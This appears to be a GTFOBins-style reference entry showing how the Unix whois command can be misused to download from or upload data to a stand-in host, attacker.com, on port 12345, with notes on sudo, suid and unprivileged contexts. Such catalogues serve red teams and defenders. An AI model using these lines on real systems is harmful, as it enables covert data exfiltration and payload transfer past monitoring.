---
type: gtfobin
name: whois
platform: Unix
functions: [download, upload]
tags: [gtfobin, unix, lotl]
---

# whois

## download

```bash
whois -h attacker.com -p 12345 x
```
_Received data has instances of the `\r` byte stripped._
**Contexts:** sudo, suid, unprivileged

## upload

```bash
whois -h attacker.com -p 12345 DATA
```
_Data is converted to lower case, and has a trailing `\r\n`._
**Contexts:** sudo, suid, unprivileged
